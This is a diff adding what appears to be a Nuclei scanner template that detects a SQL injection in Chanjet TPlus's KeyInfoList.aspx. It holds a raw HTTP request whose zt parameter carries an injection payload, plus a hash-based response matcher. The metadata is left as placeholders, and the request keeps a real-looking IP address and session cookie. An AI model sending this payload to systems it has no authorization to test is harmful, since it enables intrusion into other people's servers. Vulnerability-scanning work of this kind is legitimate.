@@ -1,0 +1,29 @@
+id: TPlus-KeyInfoList-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 畅捷通TPlus KeyInfoList.aspx SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','1')))--+ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-AjaxPro-Method: GetCompanyNameandAQD
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Referer: http://124.222.118.17:8899/tplus/view/login.html
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=1w4m0ltswmv0zvuvs2q3ozph
+        Connection: keep-alive
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
